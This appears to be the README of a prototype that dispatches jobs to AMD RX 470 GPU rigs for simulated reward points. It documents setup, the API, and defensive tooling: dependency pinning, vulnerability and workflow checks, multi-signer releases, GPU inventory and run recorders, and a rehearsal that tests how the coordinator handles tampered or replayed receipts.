- **The text "false" counted as true.** The checker asked `if not ev.get("exit_ok")`. In Python any non-empty text is true, so `"exit_ok": "false"` (a typo, or an edit) on a run that exited with code 1 made it a clean, passing smoke test (shown against the old code). Same for `target_card_busy`: a card that never got busy counted. (`matched` was already compared with `is True`, so it was safe.) Now every yes/no field must be a real `true`/`false`.
- **Crashes:** a 400-digit temperature or wattage (`OverflowError` while printing), `"readings": null` (`None > 0`), an AMD card without a `slot` or a render node without a `name` (`KeyError`, or `join` on `None`; now shown as `?`), and lists or numbers where objects belong.
- **Terminal codes:** OS, kernel, card, driver and file names were printed as written. Names the checklist prints must now be printable text of at most 200 characters; every printed line and the `--out` file names also go through `say()`.
- **Reading:** through `app/json_file.py` (new `read_bytes`, so the sha256 is of exactly the bytes parsed): regular files only (a named pipe hung it), at most 4 MiB (honest reports are 5-100 KB), strict UTF-8, depth 32, no `NaN`, no key written twice.
- **How:** `INVENTORY_SPEC` and `RUN_SPEC` in `app/phase3_check.py` list every field the checker reads and its type. Missing or `null` fields are fine (less evidence, as before); a wrong type is refused with one line naming the file and field, exit code 2. Fields the checker never reads aren't checked.
- **Also fixed elsewhere:** `json_file` and the worker's reply reader refused `NaN` and `Infinity` but let `1e400` through as infinity. Both now refuse any number that doesn't fit a float.
- **Tests** (`tests/test_rig_reports.py`): reports recorded by the real tools (format samples, fake sysfs), then every spec field replaced with every wrong type for its kind (about 600 cases; each must exit 2 with one line and no control characters), every field deleted or nulled (never a crash), the holes above one by one, unsafe JSON, a 4 MiB+ file, a named pipe, odd file names, list and object caps. A tracing test runs the checker on wrapped reports and fails if it reads any field the specs don't list, so a new field can't skip the type check.
- 23 deliberate breakages, 23 caught (one only after adding an `--out` file-name test; one turned out to be a redundant check, now removed).

**Limits:** the reports are still unsigned. This catches mistakes, sloppy edits and hostile files, not a careful forger who writes correct types; a repeat on someone else's rig is what makes them evidence. Never run on real rig output yet.

## Safety and correctness boundaries

The Ed25519 signature shows a manifest came from the holder of the coordinator's private key, but only to a worker that checks it against the right public key. The demo worker verifies it before executing. Result hashes are integrity identifiers, not proofs of execution. The coordinator is trusted in this MVP. Rewards are simulated ledger points only; no token minting, private-key handling, wallet signing, or on-chain transfer is implemented.

The reference repositories:
- https://github.com/MooreThreads/ethminer-musa
- https://github.com/simplechain-org/go-ethereum-pow

are research references only. Their PoW/consensus implementations are not integrated into this AI task execution MVP. The first is an Ethash GPU miner with vendor/backend-specific code; the second is an archived Go-Ethereum PoW fork. Neither provides verified AI inference for RX 470 by itself. Review exact licenses and notices before any code reuse.

## Quick start (Ubuntu)

    cd prototype
    python3 -m venv .venv
    . .venv/bin/activate
    pip install --require-hashes -r requirements.lock   # exact versions, each file sha256-checked
    cp .env.example .env
    python -m app.signing   # creates the signing key; share the printed public key
    uvicorn app.main:app --host 127.0.0.1 --port 8000 --no-access-log --no-proxy-headers

In another terminal, make a one-time code for the rig and start the worker with it:

    cd prototype
    . .venv/bin/activate
    CODE=$(python -m app.workers enroll --owner owner-gpu0)
    python demo_worker.py --url http://127.0.0.1:8000 --worker-id rig-gpu0 --enrollment-code "$CODE" \
        --coordinator-key <public key printed above>

Later runs reuse the saved worker key and the pinned coordinator key:

    python demo_worker.py --url http://127.0.0.1:8000 --worker-id rig-gpu0

Create a demo job using the API docs at http://127.0.0.1:8000/docs:
- POST /v1/jobs with {"payload":"hello from Boats N Hoes","task_type":"demo:sha256"}, and your `OPERATOR_TOKEN` (or `SUBMITTER_TOKEN`) in the `x-operator-token` (or `x-submitter-token`) box. Without one you get `403`.
- The demo worker claims and processes queued jobs.
- GET /v1/ledger shows simulated points.

## Pinned dependencies and licenses (`deps-check-v1`, `bnh-deps-check/1`)

`requirements.txt` lists what the prototype needs and which version ranges work. `requirements.lock` pins **every** installed package (31 for Python 3.11+ on Linux, plus `colorama` on Windows) to one exact version with sha256 hashes, made with a 7-day cooldown (only releases at least a week old; brand-new releases are where hijacked packages show up first). `pip install --require-hashes -r requirements.lock` refuses any file whose hash doesn't match, so a swapped file on the package index stops the install instead of running. `licenses.json` records each locked package's license at that version, why it's there, and the allowed list (MIT, MIT-0, BSD-2/3-Clause, Apache-2.0, ISC, PSF-2.0, MPL-2.0; `certifi` is the only MPL-2.0 one and is used unchanged).

    python -m app.deps_check lock        # files only: pins, hashes, no other indexes/URLs/files,
                                         # requirements.txt ranges, licenses.json in step with the lock
    python -m app.deps_check installed   # this environment: exact locked versions, declared licenses

CI installs from the lock and runs both. A new package or a version bump fails `lock` until someone reads its license and updates `licenses.json`. To update the lock, see the commands at the top of `requirements.lock` (needs `uv`). Both write JSON with `--out` (never over an existing file); exit 0 ok, 1 problems, 2 usage/file error.

**Limits:** hashes prove you got the same files as when the lock was made, not that those files are safe; the cooldown lowers the odds of a fresh hijack but doesn't remove them. Known security problems are checked separately (next section). Package metadata is the publisher's own claim; "BSD License" without a clause count, or no license at all, is a note for a person to check. The CI workflow's GitHub Actions are pinned by commit; see the workflow checker below.

## Known security problems in locked packages (`vuln-check-v1`, `bnh-vuln-check/1`)

A version that was fine when it was locked can later turn out to have a security hole. This asks PyPI about each exact locked version (all 32, Windows-only ones too); PyPI's answer carries the known problems for that version from the OSV database, the same source `pip-audit` uses by default.

    python -m app.vuln_check [--out vuln-check.json]

- **pass**: nothing known for that version. **fail**: a known problem, shown once even when it has several ids (GHSA, PYSEC, CVE), with the version that fixes it. Fix by raising the version in `requirements.txt` and re-making the lock with `--upgrade-package <name>` (see the lock's header), then update `licenses.json`.
- `vuln-exceptions.json` (`bnh-vuln-exceptions/1`, empty today) lists problems a person read and accepted for now: package, problem id (any of its ids), a one-sentence reason, review date and an end date at most 90 days later. Accepted ones show as notes; on the end date they fail again. Malformed or expired entries fail; unused ones are notes.
- If PyPI can't be reached (after one retry), doesn't know the version, or answers about something else, that package **fails**: "couldn't check" never counts as clean.
- Sends only package names and versions; installs and changes nothing. Exit 0 ok, 1 problems, 2 usage/file error; `--out` never overwrites.

On GitHub, the `vuln-check` workflow runs it when the lock or exceptions change, every Monday, and by hand (**Actions > vuln-check > Run workflow**); a failed scheduled run emails the repository owner. It is a separate workflow so a newly published problem doesn't block unrelated pull requests.

First run (2026-11-24) found one: `pytest` 8.4.2, CVE-2025-71176 (a local user on a shared Linux machine could interfere with pytest's temporary folders; fixed in 9.0.3). `pytest` is test-only, but it was raised to 9.2.0 anyway (`requirements.txt` now `pytest>=9.0.3,<10`); all tests pass on it. **Limits:** it only knows problems that have been found and published, so a pass means "nothing known today", not "safe". It checks the Python packages only, not llama.cpp, the GPU driver or the OS.

## Website checker (`site-check-v1`, `bnh-site-check/1`)

Not part of the worker; it checks the static site at the repo root (served by Netlify).

    python -m app.site_check static                 # reads files only; CI runs it
    python -m app.site_check live --url https://boatsnhoes.meme --out site-check.json

`static` checks that `_headers` has the security headers (HSTS ≥ 180 days, nosniff, referrer
policy, CSP, framing blocked), that every page's scripts, styles, images, frames, form
targets and scripts' `fetch()` URLs fit the CSP, that every local link and file exists and
none points into a folder `netlify.toml` hides, and that share cards are complete.
`live` sends plain GETs (redirects not followed) and checks each page answers 200 with
exactly the `_headers` values, http→https and www→bare-domain redirects, a real file in each
hidden folder answers 404, and the homepage's share image loads. Exit 0 = all good, 1 =
something failed, 2 = usage error. On GitHub: **Actions > site-check > Run workflow** runs the
live check with one click; its JSON report appears on the run's summary page. Tested against a local server and a fake site; not yet run
against boatsnhoes.meme from here (this sandbox can't reach it).

## Accessibility checker (`a11y-check-v1`, `bnh-a11y-check/1`)

Not part of the worker; it checks the static site's pages for common accessibility problems.

    python -m app.a11y_check                       # reads files only; CI runs it
    python -m app.a11y_check --out a11y.json --owner-page index.html

For each page (folders `netlify.toml` hides are skipped) it reads the HTML and the CSS the
page loads and checks: `<html lang>`, a title, zoom not blocked; `alt` on every image and
inline SVGs hidden or labelled; a readable name on every link and button (text inside
`aria-hidden` doesn't count); a label on every form field (a placeholder isn't one); one
`<h1>`, no skipped heading levels, one `<main>`, and a skip link into `<main>` (not a header
link) on pages with a menu; unique ids and `for`/`aria-*` references that exist; no
`tabindex` above 0; nothing focusable inside `aria-hidden`. CSS: text contrast at least
4.5:1 against the element's real background (its own, an ancestor's via a small selector
matcher with specificity and inline styles, every gradient stop; rules that match nothing
on the page, such as script-made content, are compared with the page background), focus
outline at least 3:1, no `outline: none` without a replacement, and a
`prefers-reduced-motion` rule whenever anything animates. Colours it can't read are notes.

The homepage is the owner's approved design, so its findings are **notes**, not failures
(`--owner-page`, default `index.html`). Exit 0 = no failures, 1 = something failed, 2 =
usage error. Limits: no real screen reader, no wording checks, and selectors beyond simple
classes/tags/ids/attributes and `>` fall back to the page background. A pass means "none of
these known problems", not "fully accessible". Cross-checked once with axe-core 4.10.2 in
Chromium (see BUILD-LOG 0.5.50).

## Workflow checker (`actions-pin-v1`, `bnh-workflow-check/1`)

Not part of the worker; it checks `.github/workflows/` (reads files only; CI runs it).

    python -m app.workflow_check [--workflows ../.github/workflows] [--out f.json]

Every `uses:` must be pinned to a full 40-character commit hash with the release it stands
for as a comment (`actions/checkout@<hash> # v4`), the same hash everywhere, from a reviewed
owner (`ALLOWED_OWNERS`, today only `actions`); a local `./` action or a `docker://` image
by `@sha256:` digest is fine. Each workflow needs a top-level `permissions:` with no write
access (unless listed in `WRITE_ALLOWED` with a reason), no `pull_request_target` or
`workflow_run` trigger, `persist-credentials: false` on `actions/checkout`, and no `${{ }}`
inside a `run:` script (pass values through `env:`). Exit 0 ok, 1 problems, 2 usage/no files.

To update a pinned action: push a branch that uses the tag (e.g. `@v5`) once, read the
"Download action repository 'actions/setup-python@v5' (SHA:...)" line in that CI run's log,
and pin to that hash. **Limit:** the checker can't tell whether a hash really belongs to the
release its comment names; that part is a person's (or Dependabot's) job.

## Signed worker releases, several signers (`release-sign-v1`)

Threat: someone hands a rig owner a fake or tampered copy of the worker ("download the new
miner here"), or one stolen key is enough to push a bad release. A release only counts when
at least `threshold` (minimum 2) **different** people from a pinned signer list have each
signed it with their own Ed25519 key.

    python -m app.release keygen --out ~/bnh-private/release-signer.key --name alice   # each signer, once
    python -m app.release make --root . --version 0.5.49 --out ../release/release.json  # from a clean checkout
    python -m app.release sign ../release/release.json --key ~/bnh-private/release-signer.key --name alice
    python -m app.release verify ../release/release.json --signers release-signers.json --root . [--not-older-than 0.5.48] [--json]

- `make` lists every file **git tracks** under `--root` with its sha256 and size
  (`bnh-release/1`, sorted, with the source commit) and writes a plain `SHA256SUMS` next to
  it (`sha256sum -c` works without this tool). Untracked files such as `.env`, keys and
  databases are never swept in. Refuses uncommitted changes to tracked files, symlinks, and
  overwriting an existing release.
- `sign` adds one signature to `release.sigs.json` (`bnh-release-signatures/1`) over the
  release's sha256 with its own `purpose`, so a job or report signature can't stand in for
  it. Never creates a key; refuses a key file others can read, a second signature from the
  same name or key, and a signature file that belongs to another release.
- `keygen` writes an owner-only key, never overwrites one and refuses any folder inside a
  git checkout. It prints the public half as the JSON line to add to the signer list.
- The signer list (`bnh-release-signers/1`: `threshold` and `signers` with `name` and
  `public_key`) is pinned on each rig; a release can't bring its own. Threshold must be at
  least 2 and no more than the signers listed; the same key can't be listed twice.
- `verify` passes only when the manifest is well formed, enough distinct pinned signers
  signed exactly it, **every** signature present from a listed signer is valid (a listed
  name with a different key fails), and with `--root` every listed file matches, nothing is
  a symlink or points outside, and nothing else in the folder could be imported by Python
  (`release-folder-v1`, 0.5.57: no extra `.py`, `.pyc`, `.so`, `.pth` or other importable
  file, no links, no folder it can't read, and every `__pycache__` file this Python might
  load is byte-for-byte what it builds from the checked source; other extra files are
  notes; `data/`, `venv`, `node_modules` and hidden folders are skipped).
  Signatures from people not on the list are noted and not counted. `--not-older-than`
  refuses an old signed release (rollback). Exit 0 ok, 1 not ok, 2 unusable input.

**Limits:** it proves enough named people agreed to ship exactly these files, not that the
code is safe or that a signer's computer was clean. It checks Python files the worker runs,
not llama.cpp, model files (those have `model_registry` pins) or the OS. No real signer keys
exist yet and no release has been signed: choosing the signers is an owner step.

## Tests

    cd prototype
    . .venv/bin/activate
    pytest -q

A GitHub Actions workflow runs these tests on pushes and pull requests affecting prototype files, site files or workflows.

## API outline

- `GET /v1/coordinator/key` — public: the coordinator's Ed25519 public key, fingerprint, signed key handovers (`rotations`) and, if set, the announced offline handover key (`handover_key`).
- `python -m app.key_rotation rotate|show|make-handover-key` — CLI only: planned key rotation with a handover signed by both keys, and optionally by the offline handover key (see above).
- `POST /v1/enrollments` — operator only: make a one-time enrollment code for an owner.
- `POST /v1/workers/register` — new worker: send the enrollment code, get a key once. Existing worker: send its key to update capabilities.
- `POST /v1/workers/{worker_id}/revoke` — operator only: block a worker's key and requeue its job.
- `POST /v1/jobs` — queue a job (needs `X-Submitter-Token` or `X-Operator-Token`); with `POINTS_TABLE` set, its points come from the table.
- `POST /v1/jobs/next` — worker claims the next queued job (needs its key).
- `POST /v1/jobs/{job_id}/submit` — submit a versioned receipt (`bnh-receipt/1`) with the result (needs its key).
- `GET /v1/ledger?limit=&order=&after=` — view simulated accepted-work entries (in pages of `limit`, default 100, at most 1000; `next_after` gets the next page, `ledger-pages-v1`) and points by status. Public view shows each result's bucket and confidence only `PUBLIC_SETTLE_DELAY_SECONDS` after it was accepted (`public-delay-v1`) and never shows result hashes (`public-no-hashes-v1`); its job counts (like `/health`'s) are taken once per `PUBLIC_COUNTS_INTERVAL_SECONDS` window, default 900, and repeated until the next one (`public-counts-v1`, with `jobs_counted_at` and `jobs_next_count_at`), and so are its point totals and consistency check (`totals_taken_at`, since 0.5.63); with `X-Operator-Token` it is live and complete.
- `GET /v1/jobs/{job_id}` — job status and its public audit trail (oldest first, at most 200 events, `events_total` says how many; a refused submission is written once per job, rig and reason, `refusal-log-v1`).
- `POST /v1/challenges` — operator only: queue a hidden known-answer job; optional `target_worker` or `target_tier` aims it at one rig or a trust tier; refused (`409`) if its input, or a near copy of it (same words ignoring case, spacing, punctuation and settings such as the seed), was a hidden test in a period a ledger copy already covers (`test-reuse-v2`).
- `GET /v1/audits` — operator only: every audit and challenge with its outcome.
- `GET /v1/workers/{worker_id}/trust` — operator only: how a worker's results held up, plus its audit tier (`new`/`established`/`suspect`), the re-check rate that applies to it, `checks_passed` and `strikes`.
- `GET /v1/rewards/report?since=&until=&sign=` — operator only: simulated reward report for a period; `sign=true` adds the coordinator's signature (closed periods only).
- `python -m app.ledger_copy export|info|compare` — CLI only: redacted ledger copy for a closed, settled period, and a check that a newer copy kept an older one's history unchanged (see above).
- `python -m app.publish_report add|check` — CLI only: put a closed period's signed report and ledger copy into `reports/` (the site's /reports/ page and GitHub), and re-check everything already there (see above).
- `GET /health` — public health check: `200` ok or paused / `503` down, `accepting_work`, `paused_since`, uptime, job counts, and the job/receipt schema versions spoken.
- `POST /v1/operator/pause` — operator only: emergency pause (`pause-v1`). Resume only on the server: `python -m app.incident resume --note ...`.
- `GET /v1/operator/health` — operator only: workers, queue, waiting audits, review-queue counts, recent events, consistency problems and warnings.
- `GET /v1/operator/review?needs_person_only=` — operator only: held cases with every answer side by side and whether a person needs to look (read-only). CLI: `python -m app.review`.
- `GET /v1/operator/vouches` — operator only: rigs that agreed with a rig later caught, and confirmations resting only on a caught rig (read-only, no prompts or answers). CLI: `python -m app.vouches`. Since 0.5.44 also `open_aimed_tests` per lead and `leads_to_test`; `python -m app.challenge_pool issue-leads` aims one test at each.

## GPU diagnostic

From the prototype directory:

    python -m app.gpu_probe_cli

This checks whether `vulkaninfo --summary` can run. Device enumeration is not proof that AI inference works.

For the full rig inventory (Phase 3 step one), run on the Ubuntu machine with the cards:

    python -m app.hw_inventory --out inventory.json

It reads `/etc/os-release`, runs only `uname -r`, `lspci -nnk` and `vulkaninfo --summary` (an allowlist, no shell, no sudo, nothing installed), lists `/dev/dri`, and writes a versioned JSON report (`bnh-hw-inventory/1`) with plain-language findings:

- how many AMD cards `lspci` sees, with PCI IDs, and which kernel driver each uses (warns on `radeon` or none: Vulkan RADV needs `amdgpu`);
- each Vulkan device with its driver and Mesa version (warns when Vulkan only sees a CPU renderer such as llvmpipe, or sees fewer AMD cards than `lspci`);
- `/dev/dri/renderD*` nodes your user can't open (usually the `render` group).

Hostname, username and UUIDs are replaced with `[host]`, `[user]` and `[uuid]`. It refuses to overwrite an existing file and always says `"proves_inference": false`. Missing tools are reported with the Ubuntu package name; installing them, changing drivers or groups is the owner's decision. Tested only against format samples of command output (`tests/test_hw_inventory.py`), not on the real rig yet. Then test each GPU separately.

### GPU sensor readings (temperature, power, VRAM, clocks)

While a test runs on one card, record how hot, busy and full it gets:

    python -m app.gpu_sensors                                   # one snapshot of every card
    python -m app.gpu_sensors --card card1 --samples 120 --interval 1 --out gpu1-run1-sensors.json

It only **reads** the files the amdgpu driver already publishes under `/sys/class/drm/cardN/device` (`mem_info_vram_*`, `gpu_busy_percent`, `pp_dpm_sclk`/`pp_dpm_mclk`) and its `hwmon` folder (`temp1_*`, `power1_average` or `power1_input`, `power1_cap`, `fan1_input`). No commands, no sudo, never writes to sysfs (no overclocking, fan or power changes), never reads serial numbers or `unique_id`. Connectors (`card0-DP-1`) and render nodes are skipped.

The JSON report (`bnh-gpu-sensors/1`) has each card's PCI slot (to match the inventory), driver, last reading and, over the watch, the lowest/highest/average temperature, power, VRAM use, busy %, core/memory clock and fan speed. Findings warn when a card reaches 85 °C or comes within 5 °C of the driver's own critical limit, when VRAM use reaches 90 %, when a card isn't on `amdgpu`, when a sensor is missing, or when a card stayed at 0 % busy for the whole watch (so the test didn't run there). `--samples` is 1-3600 and `--interval` 0.5-60 s; Ctrl-C keeps the readings taken so far (`stopped_early`). It refuses to overwrite a file, checked before the watch starts, and always says `"proves_inference": false`. Tested only against fake sysfs trees laid out like amdgpu's (`tests/test_gpu_sensors.py`), not on the real rig yet. Throughput and errors still come from the test itself.

### Recording one test run on one card

When you're ready for the first smoke test, run it through the run recorder instead of on its own:

    python -m app.gpu_run --card card1 --label "smoke test 1, gpu1" --out gpu1-run1.json \
        --expect-file expected.txt -- ./llama-cli -m models/tiny.gguf -p "Hello" -n 16 --seed 1

It refuses to start if `--out` already exists, if the command is `sudo`/`su`/`doas`/`pkexec`/`runuser`, or if an `--env NAME=value` name looks like a secret (`TOKEN`, `SECRET`, `PASS`, `KEY`, ...; every `--env` value is saved in the report). It then hashes the program and every argument that names an existing file (the model, a prompt file), takes one sensor reading of every card, runs your command (no shell, stdin closed, its own process group), reads every card again every `--interval` seconds (0.5-60, default 1) until it ends, stops it and anything it started after `--timeout` seconds (default 900) or on Ctrl-C, and takes one last reading.

The JSON report (`bnh-gpu-run/1`) has the exit code, duration, the sha256 and last 40 lines of stdout and stderr, whether stdout matched what you expected (`--expect-sha256` exact, or `--expect-file` after collapsing whitespace, the same tolerance as `llm:generate`; partial output from a stopped run is never compared), and per card the readings before, the lowest/highest/average during, the readings after and the VRAM the run added. Hostname and username are blanked as in the inventory.

The key finding is **which card actually did the work** (`evidence.target_card_busy`, `evidence.busy_elsewhere`, "busy" meaning at least 10 % `gpu_busy_percent`): if card1 stayed idle while card0 got busy, the report says the test most likely ran on card0 (check the program's device setting, e.g. `GGML_VK_VISIBLE_DEVICES` for llama.cpp's Vulkan build); if no card got busy, it most likely ran on the CPU. It also warns when the card was already busy before the start, on heat, on VRAM at 90 %, and when the run was too short to tell. Exit code 0 means the command succeeded and the output didn't mismatch; 1 means it failed, timed out or mismatched; 2 means it refused to run.

It always says `"proves_inference": false`: one report is a record, and becomes evidence when someone else repeats the same command with the same file hashes and gets the same output. Tested only with small Python programs writing into fake sysfs trees (`tests/test_gpu_run.py`); never run on the real rig yet.

## Phase 3 evidence check (`bnh-phase3-check/1`)

Once the inventory and one `gpu_run` report per card exist, `python -m app.phase3_check` reads them (files only, no commands, no GPU needed) and walks the ten Track B items in `docs/ROADMAP.md`:

    python -m app.phase3_check --inventory inventory.json gpu0-run1.json gpu1-run1.json --out phase3-check.json

Each item gets `evidenced`, `partial`, `missing` or `problem` with a one-line reason (wrong driver, CPU-only Vulkan, a render node your user can't open, counts that disagree between lspci, Vulkan and `/dev/dri`, cards that aren't PCI device `1002:67df`). A run only counts as a smoke test if it exited cleanly, matched a known-good answer (`--expect-file`/`--expect-sha256`), kept the card it was aimed at busy and no other card, the card is on `amdgpu`, and its PCI slot is one the inventory saw. Cards are matched by PCI slot, not by `cardN`, because names can change after a reboot. "Repeat on GPU 1" needs the same test (same program hash, same argument-file hashes, same expected answer) passing in a second slot; the command line itself may differ, since device flags do. Sensors and versions are never more than `partial`: stability and the runtime's own version (for llama.cpp, the commit) are yours to judge and write down.

The result lists each input by file name and sha256 (never full paths). A run file saying `proves_inference: true` is treated as edited. Exit code 0 = the eight required items are evidenced, 1 = not yet, 2 = a file is missing, not plain JSON, the wrong kind of report, has a field of the wrong type (`rig-report-v1`, see above), or `--out` exists. The files are unsigned, so this catches mistakes and mismatches, not a forger; `proves_inference` stays false. Tested with inventories built from format samples and runs recorded against fake sysfs trees (`tests/test_phase3_check.py`); never run on rig output yet.

## Two-worker rehearsal (Track F prep, `bnh-rehearsal/1`)

Track F asks to show dispatch to two workers, accepted and rejected receipts, and how the coordinator handles duplicate, malformed, expired and replayed submissions. `python -m app.rehearsal` does that list from the outside, over HTTP, acting as two workers (`<run id>-gpu0`, `<run id>-gpu1`) that each get a one-time enrollment code:

    # Anywhere, no setup: a throwaway coordinator with a temporary database
    python -m app.rehearsal --local --out rehearsal.json

    # Against a running coordinator with its OWN test database (it enrolls workers and queues jobs)
    OPERATOR_TOKEN=... python -m app.rehearsal --url http://127.0.0.1:8000 --allow-writes --out rehearsal.json

It runs 28 checks with tiny `demo:sha256` jobs, one job at a time: both workers' honest answers accepted; a tampered and an expired job refused by the worker's own check; a duplicate accepted as a replay and paid once (`200`); a changed answer or another worker's answer after acceptance (`409`); a job leased to someone else (`403`); a bad result hash, a missing field, a body that isn't JSON, impossible timestamps, an unknown receipt version (`422`); no key or a made-up key (`401`); an unknown job (`404`); a valid receipt from job 3 replayed onto job 4 (`422`, job 4 still leased); a wrong answer (`422`, job requeued, then done by the other worker); answering before claiming (`409`); answering after a 10 s deadline (`410`); then the ledger's own consistency checks, no rehearsal job left open, and both workers revoked. Each check records what it sent, the expected and actual status, and the coordinator's message.

Refuses to start if `--out` exists, with `--url` but without `--allow-writes` or without `OPERATOR_TOKEN` in the environment (never on the command line), or while the coordinator has queued jobs. If someone queues a job mid-run and a rehearsal worker is handed it, it stops without running it, and revoking the worker puts that job back in the queue. Worker keys and the operator token never go in the report. Exit code 0 = every check passed, 1 = a check failed or the run stopped early, 2 = refused to start.

`proves_gpu` and `proves_inference` are always false: it tests the coordinator's rules, with SHA-256 sums done on the CPU. Run in-process by `tests/test_rehearsal.py` (12 tests, including a coordinator that accepts any answer, which the rehearsal flags) and once against a real `uvicorn` coordinator on this cloud machine (28 of 28, about 11 s because the expiry check really waits). Running two real workers on the two RX 470s is still Track F's own step.

## Not implemented

- Real model inference on RX 470.
- Public deployment security: TLS, DDoS protection and abuse prevention beyond the simple per-address limits above. Workers authenticate with per-worker keys; queuing jobs needs a submitter or operator token.
- Ethereum ERC-20 integration or reward distribution.

Treat this as an engineering starter, not production infrastructure.
